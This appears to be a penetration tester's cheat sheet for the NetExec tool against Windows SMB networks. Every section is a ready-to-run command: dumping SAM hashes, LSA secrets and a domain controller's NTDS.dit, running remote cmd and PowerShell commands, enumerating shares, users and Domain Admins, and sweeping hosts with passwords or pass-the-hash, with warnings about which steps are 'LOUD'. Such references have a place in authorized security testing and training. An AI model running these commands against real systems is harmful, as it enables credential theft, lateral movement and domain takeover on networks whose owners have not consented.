# NetExec

### Find ip/hostname/SMB Signinig/etc:

```bash
sudo netexec smb targets.txt
sudo netexec smb targets.txt --gen-relay-list relay.txt
```

### Enumerate SAM hashes

```bash
sudo netexec smb ip -u user -p 'password' --sam
sudo netexec smb ip -u user -p 'password' --sam --user target-user
```

### Enumerate LSA for potential plaintext passwords

```bash
sudo netexec smb ip -u user -p 'password' --lsa
```

### Enumerate shares

```bash
sudo netexec smb ip -u user -p 'password' --shares
```

### Pass cmd

```bash
sudo netexec smb ip -u user -p 'password' -x 'command'
```

### Pass powershell

```bash
sudo netexec smb ip -u user -p 'password' -X 'command'
```

### Look at domain admins

```bash
sudo netexec smb ip -u user -p 'password' -x 'net group "Domain Admins" /domain'
```

### Look at logged on users

```bash
sudo netexec smb ip -u user -p 'password' --loggedon-users
```

### Look at NTDS.dit

This is LOUD - use it with caution

```bash
sudo netexec smb dc-ip -u domain-admin-user -p 'password' --ntds
```

### Find out what machines a user can successfully log onto

This is LOUD - use it with caution

```bash
sudo netexec smb targets.txt -u user -p 'password'
sudo netexec smb targets.txt -u user -H 'hash'
```
